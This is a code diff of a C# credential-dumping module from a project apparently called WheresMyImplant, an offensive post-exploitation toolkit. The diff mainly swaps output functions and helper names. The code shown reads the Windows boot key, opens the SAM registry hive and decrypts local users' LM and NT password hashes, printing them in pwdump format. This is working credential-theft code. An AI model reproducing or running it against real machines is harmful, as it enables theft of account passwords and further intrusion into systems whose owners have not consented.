@@ -1,13 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Security.Principal;
 using System.Security.Cryptography;
-using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
 
-using Unmanaged.Libraries;
+using MonkeyWorks;
+using MonkeyWorks.Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
@@ -24,9 +23,9 @@ namespace WheresMyImplant
         internal SAM()
         {
             Byte[] bootKey = LSASecrets.GetBootKey();
-            WriteOutputGood(String.Format("BootKey: {0}", System.BitConverter.ToString(bootKey).Replace("-","")));
+            Console.WriteLine("[+] BootKey: {0}", System.BitConverter.ToString(bootKey).Replace("-",""));
             Byte[] hBootKey = GetHBootKey(bootKey);
-            WriteOutputGood(String.Format("HBootKey: {0}", System.BitConverter.ToString(hBootKey).Replace("-", "")));
+            Console.WriteLine("[+] HBootKey: {0}", System.BitConverter.ToString(hBootKey).Replace("-", ""));
             UserKeys[] userKeys = GetUserHashes(hBootKey);
             DecryptUserHashes(ref userKeys, hBootKey);
         }
@@ -44,10 +43,10 @@ namespace WheresMyImplant
                     using (MD5 md5 = new MD5CryptoServiceProvider())
                     {
                         Byte[] compute = new Byte[0];
-                        compute = Misc.Combine(compute, F.Skip(0x70).Take(0x10).ToArray());
-                        compute = Misc.Combine(compute, qwerty);
-                        compute = Misc.Combine(compute, bootKey);
-                        compute = Misc.Combine(compute, numeric);
+                        compute = Combine.combine(compute, F.Skip(0x70).Take(0x10).ToArray());
+                        compute = Combine.combine(compute, qwerty);
+                        compute = Combine.combine(compute, bootKey);
+                        compute = Combine.combine(compute, numeric);
                         Byte[] rc4Key = md5.ComputeHash(compute);
                         return Misc.RC4Encrypt(rc4Key, F.Skip(0x80).Take(0x20).ToArray());
                     }
@@ -92,12 +91,12 @@ namespace WheresMyImplant
             {
                 if (advapi32.RegOpenKeyEx(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\Names\" + name, 0, Reg.KEY_QUERY_VALUE, out hKey) != 0)
                 {
-                    WriteOutputBad(String.Format("Error opening key '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, ""));
+                    Console.WriteLine("[-] Error opening key '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "");
                     return null;
                 }
                 if (advapi32.RegQueryValueEx(hKey, "", 0, ref type, IntPtr.Zero, ref size) != 0)
                 {
-                    WriteOutputBad(String.Format("[-] Error querying value '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, ""));
+                    Console.WriteLine("[-] [-] Error querying value '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "");
                     return null;
                 }
                 ridMapping[type] = name;
@@ -125,7 +124,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal void DecryptUserHashes(ref UserKeys[] userKeys, Byte[] hBootKey)
         {
-            WriteOutput("");
+            Console.WriteLine("");
             foreach (UserKeys userKey in userKeys)
             {
                 Byte[] lmHashArray = { 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee};
@@ -144,7 +143,7 @@ namespace WheresMyImplant
                 ntHash = BitConverter.ToString(Decrypt(encryptedNtHash, userKey.rid, hBootKey, ntPass, ntHashArray)).Replace("-", "");
 
                 String pwFormat = String.Format("{0}:{1}:{2}:{3}:::", userKey.userName, userKey.rid, lmHash.ToLower(), ntHash.ToLower());
-                WriteOutput(pwFormat);
+                Console.WriteLine(pwFormat);
             }
         }
 
@@ -165,7 +164,7 @@ namespace WheresMyImplant
                         return blankHash;
                 }
             }
-            catch (Exception error)
+            catch (Exception)
             {
                 return blankHash;
             }
@@ -186,14 +185,14 @@ namespace WheresMyImplant
             Byte[] rc4DecryptedHash;
             using (MD5 md5 = new MD5CryptoServiceProvider())
             {               
-                Byte[] combined = Misc.Combine(Misc.Combine(hBootKey.Take(16).ToArray(), BitConverter.GetBytes(rid)), hashType);
+                Byte[] combined = Combine.combine(Combine.combine(hBootKey.Take(16).ToArray(), BitConverter.GetBytes(rid)), hashType);
 
                 Byte[] hash = md5.ComputeHash(combined);
                 rc4DecryptedHash = Misc.RC4Encrypt(hash, encryptedHash);
             }
             Byte[] desDecryptedHash1 = DecryptDes(rc4DecryptedHash.Take(8).ToArray(), desKeys[0]);
             Byte[] desDecryptedHash2 = DecryptDes(rc4DecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
-            return Misc.Combine(desDecryptedHash1, desDecryptedHash2);
+            return Combine.combine(desDecryptedHash1, desDecryptedHash2);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -220,7 +219,7 @@ namespace WheresMyImplant
             }
             Byte[] desDecryptedHash1 = DecryptDes(aesDecryptedHash.Take(8).ToArray(), desKeys[0]);
             Byte[] desDecryptedHash2 = DecryptDes(aesDecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
-            return Misc.Combine(desDecryptedHash1, desDecryptedHash2);
+            return Combine.combine(desDecryptedHash1, desDecryptedHash2);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
